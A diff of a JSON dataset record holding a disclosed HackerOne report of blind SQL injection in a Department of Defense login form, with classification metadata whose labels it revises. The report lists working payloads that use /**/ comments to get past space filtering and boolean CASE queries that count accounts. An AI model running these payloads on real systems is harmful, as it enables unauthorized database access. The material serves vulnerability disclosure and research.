@@ -1,45 +1,46 @@
 {
-    "reported_to": "U.S. Dept Of Defense",
-    "reported_by": "erbbysam ",
-    "title": "SQLi in login form of \u2588\u2588\u2588\u2588\u2588",
-    "content": "\nSummary\nThe following is vulnerable to a sqli, due to a limited char set this is t\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588y to demonstrate and not picked up by sqlmap.\nCode 50 Bytes\n1POST /\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588.asp HTTP/\u2588\u2588\u2588\u2588\u2588.\u2588\u2588\u2588\u2588\n2Host: \u2588\u2588\u2588\u2588\u2588\u2588\u2588\nDescription\nCode 777 Bytes\n1POST /\u2588\u2588\u2588\u2588\u2588\u2588.asp HTTP/\u2588\u2588\u2588\u2588.\u2588\u2588\u2588\n2Host: \u2588\u2588\u2588\u2588\u2588\n3Connection: close\n4Content-Length: 45\n5Cache-Control: max-age=0\n6Upgr\u2588\u2588\u2588\u2588\u2588\u2588\u2588e-Insecure-Requests: \u2588\u2588\u2588\n7Origin: https://\u2588\u2588\u2588\u2588\n8Content-Type: application/x-www-form-urlencoded\n9User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u25880_\u2588\u2588\u2588\u25885_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4254.0 Safari/537.36\n10Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9\n11Sec-Fetch-Site: same-origin\n12Sec-Fetch-Mode: navigate\n13Sec-Fetch-User: ?\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\n14Sec-Fetch-Dest: document\n15Referer: https://\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588/wireless/index.asp\n16Accept-Encoding: gzip, deflate\n17Accept-Language: en-US,en;q=0.9\n18Cookie: \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\n19\n20usr='/**/or/**/lastName!='&pwd=\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\nreturns a 302 with a login error message, while an invalid column name returns a 500 error message. Note that spaces are not accepted, so I must replace them with /**/.\nTo summarize:\nusr='/**/or/**/lastName!='&pwd=\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 -> 302\nusr='/**/or/**/abc!='&pwd=\u2588\u2588\u2588 -> 500\ncase error g\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588get (which could be used to exfil data):\nusr=asdf'/**/and/**/lastName/**/in/**/(select/**/CASE/**/WHEN/**/(SELECT/**/count(*)/**/FROM/**/accounts)>\u2588\u2588\u25880000/**/THEN/**/'a'/**/ELSE/**/\u2588\u2588\u2588/**/END)/**/and/**/usr!='&pwd=\u2588\u2588\u2588\u2588 -> 302\nusr=asdf'/**/and/**/lastName/**/in/**/(select/**/CASE/**/WHEN/**/((SELECT/**/count(*)/**/FROM/**/accounts)<\u2588\u2588\u2588\u2588\u2588\u25880000)/**/THEN/**/'a'/**/ELSE/**/\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588/**/END)/**/and/**/usr!='&pwd=\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 -> 500\nUsing this, we can prove that there are 26 user accounts:\nusr=asdf'/**/and/**/lastName/**/in/**/(select/**/CASE/**/WHEN/**/((SELECT/**/count(*)/**/FROM/**/accounts)=500000)/**/THEN/**/'a'/**/ELSE/**/\u2588\u2588\u2588\u2588\u2588\u2588\u2588/**/END)/**/and/**/usr!='&pwd=\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 -> 302\nusr=asdf'/**/and/**/lastName/**/in/**/(select/**/CASE/**/WHEN/**/((SELECT/**/count(*)/**/FROM/**/accounts)=26)/**/THEN/**/'a'/**/ELSE/**/\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588/**/END)/**/and/**/usr!='&pwd=\u2588\u2588\u2588\u2588\u2588\u2588 -> 500\nI have not exfiltrated any data with the exception of column names, the table name and the fact that there are 26 user accounts in this service.\nif you would like me to, I believe I can escalate this to allow me to login to this service, but I am not doing that without permission\nImpact\nSQLi, likely escalation to full service compromise\n\n",
-    "severity": [
-        9.0,
-        10.0
+  "reported_to": "U.S. Dept Of Defense",
+  "reported_by": "erbbysam ",
+  "title": "SQLi in login form of \u2588\u2588\u2588\u2588\u2588",
+  "content": "\nSummary\nThe following is vulnerable to a sqli, due to a limited char set this is t\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588y to demonstrate and not picked up by sqlmap.\nCode 50 Bytes\n1POST /\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588.asp HTTP/\u2588\u2588\u2588\u2588\u2588.\u2588\u2588\u2588\u2588\n2Host: \u2588\u2588\u2588\u2588\u2588\u2588\u2588\nDescription\nCode 777 Bytes\n1POST /\u2588\u2588\u2588\u2588\u2588\u2588.asp HTTP/\u2588\u2588\u2588\u2588.\u2588\u2588\u2588\n2Host: \u2588\u2588\u2588\u2588\u2588\n3Connection: close\n4Content-Length: 45\n5Cache-Control: max-age=0\n6Upgr\u2588\u2588\u2588\u2588\u2588\u2588\u2588e-Insecure-Requests: \u2588\u2588\u2588\n7Origin: https://\u2588\u2588\u2588\u2588\n8Content-Type: application/x-www-form-urlencoded\n9User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u25880_\u2588\u2588\u2588\u25885_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4254.0 Safari/537.36\n10Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9\n11Sec-Fetch-Site: same-origin\n12Sec-Fetch-Mode: navigate\n13Sec-Fetch-User: ?\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\n14Sec-Fetch-Dest: document\n15Referer: https://\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588/wireless/index.asp\n16Accept-Encoding: gzip, deflate\n17Accept-Language: en-US,en;q=0.9\n18Cookie: \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\n19\n20usr='/**/or/**/lastName!='&pwd=\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\nreturns a 302 with a login error message, while an invalid column name returns a 500 error message. Note that spaces are not accepted, so I must replace them with /**/.\nTo summarize:\nusr='/**/or/**/lastName!='&pwd=\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 -> 302\nusr='/**/or/**/abc!='&pwd=\u2588\u2588\u2588 -> 500\ncase error g\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588get (which could be used to exfil data):\nusr=asdf'/**/and/**/lastName/**/in/**/(select/**/CASE/**/WHEN/**/(SELECT/**/count(*)/**/FROM/**/accounts)>\u2588\u2588\u25880000/**/THEN/**/'a'/**/ELSE/**/\u2588\u2588\u2588/**/END)/**/and/**/usr!='&pwd=\u2588\u2588\u2588\u2588 -> 302\nusr=asdf'/**/and/**/lastName/**/in/**/(select/**/CASE/**/WHEN/**/((SELECT/**/count(*)/**/FROM/**/accounts)<\u2588\u2588\u2588\u2588\u2588\u25880000)/**/THEN/**/'a'/**/ELSE/**/\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588/**/END)/**/and/**/usr!='&pwd=\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 -> 500\nUsing this, we can prove that there are 26 user accounts:\nusr=asdf'/**/and/**/lastName/**/in/**/(select/**/CASE/**/WHEN/**/((SELECT/**/count(*)/**/FROM/**/accounts)=500000)/**/THEN/**/'a'/**/ELSE/**/\u2588\u2588\u2588\u2588\u2588\u2588\u2588/**/END)/**/and/**/usr!='&pwd=\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 -> 302\nusr=asdf'/**/and/**/lastName/**/in/**/(select/**/CASE/**/WHEN/**/((SELECT/**/count(*)/**/FROM/**/accounts)=26)/**/THEN/**/'a'/**/ELSE/**/\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588/**/END)/**/and/**/usr!='&pwd=\u2588\u2588\u2588\u2588\u2588\u2588 -> 500\nI have not exfiltrated any data with the exception of column names, the table name and the fact that there are 26 user accounts in this service.\nif you would like me to, I believe I can escalate this to allow me to login to this service, but I am not doing that without permission\nImpact\nSQLi, likely escalation to full service compromise\n\n",
+  "severity": [
+    9.0,
+    10.0
+  ],
+  "bounty": null,
+  "weaknesses": [
+    "SQL Injection"
+  ],
+  "screenshots": {},
+  "disclosed_date": 1601425680,
+  "report_url": "https://hackerone.com/reports/982202",
+  "is_multi_component": false,
+  "complexity": "MEDIUM",
+  "novelty": "MEDIUM",
+  "vuln_category": "WEB_APP",
+  "steps": [
+    [
+      1,
+      "Send a POST request to the vulnerable login form with a crafted SQLi payload replacing spaces with /**/ to bypass filtering, e.g., usr='/**/or/**/lastName!='&pwd=\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588"
     ],
-    "bounty": null,
-    "weaknesses": [
-        "SQL Injection"
-    ],
-    "screenshots": {},
-    "disclosed_date": 1601425680,
-    "report_url": "https://hackerone.com/reports/982202",
-    "is_multi_component": false,
-    "complexity": "MEDIUM",
-    "novelty": "MEDIUM",
-    "vuln_category": "WEB_APP",
-    "steps": [
-        [
-            1,
-            "Send a POST request to the vulnerable login form with a crafted SQLi payload replacing spaces with /**/ to bypass filtering, e.g., usr='/**/or/**/lastName!='&pwd=\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588"
-        ],
-        [
-            2,
-            "Observe the response codes (302 for valid SQL conditions, 500 for invalid) to infer database structure and perform blind SQLi"
-        ]
-    ],
-    "vuln_description": "The login form is vulnerable to blind SQL injection due to improper input sanitization, allowing an attacker to infer database structure and extract information through differential responses (302 vs 500 errors). The attack requires bypassing space character filtering using /**/ comments.",
-    "reason": "While the vulnerability itself is a standard SQLi, the discovery required: 1) identifying the space character filtering, 2) developing a bypass using /**/ syntax, 3) constructing differential queries based on error responses, and 4) interpreting blind SQLi results through HTTP status codes. The need to chain these non-obvious bypass techniques with blind inference methods elevates the complexity.",
-    "new_complexity": "HIGH",
-    "requires_code": false,
-    "requires_CVE": false,
-    "is_ctf": false,
-    "other_report": null,
-    "injection_metadata": {
-        "is_simple_payload": false
-    },
-    "authnz_metadata": {
-        "reason": "The SQL injection vulnerability involves manipulating the login form with SQL payloads, which is a different class of vulnerability than the AuthN/AuthZ bypass or IDOR vulnerabilities described in the methodologies. The methodologies focus on testing authorization boundaries by swapping user sessions or resource IDs, not on injecting malicious SQL queries.",
-        "is_detectable": false
-    }
+    [
+      2,
+      "Observe the response codes (302 for valid SQL conditions, 500 for invalid) to infer database structure and perform blind SQLi"
+    ]
+  ],
+  "vuln_description": "The login form is vulnerable to blind SQL injection due to improper input sanitization, allowing an attacker to infer database structure and extract information through differential responses (302 vs 500 errors). The attack requires bypassing space character filtering using /**/ comments.",
+  "reason": "While the vulnerability itself is a standard SQLi, the discovery required: 1) identifying the space character filtering, 2) developing a bypass using /**/ syntax, 3) constructing differential queries based on error responses, and 4) interpreting blind SQLi results through HTTP status codes. The need to chain these non-obvious bypass techniques with blind inference methods elevates the complexity.",
+  "new_complexity": "HIGH",
+  "requires_code": false,
+  "requires_CVE": false,
+  "is_ctf": false,
+  "other_report": null,
+  "injection_metadata": {
+    "reasoning": "The SQLi vulnerability described requires bypassing space restrictions via `/**/` and uses conditional error-based responses for detection. The 'Simple Payloads' methodology uses generic payloads without custom filter bypasses (e.g., space replacement). Since the exploit relies on non-standard syntax adjustments not included in 'simple' payload lists, and SQLmap (which uses generic payloads) failed to detect it, this vulnerability would likely not be found using the proposed methodology. However, the detection of errors via HTTP status codes (302/500) aligns with 'same-channel' analysis, but the payload complexity exceeds the methodology's scope.",
+    "is_simple_injection": false
+  },
+  "authnz_metadata": {
+    "reason": "The SQL injection vulnerability involves manipulating the login form parameters to bypass authentication or extract data, which falls under the AuthN/AuthZ bypass category. The methodology involves testing with different inputs (like SQL injection payloads) to see if unauthorized access or data extraction is possible. Since the report demonstrates the ability to infer database structure and count user accounts through crafted SQL queries, it aligns with the AuthN/AuthZ bypass detection method where unauthorized data access is achieved.",
+    "is_detectable": true
+  }
 }
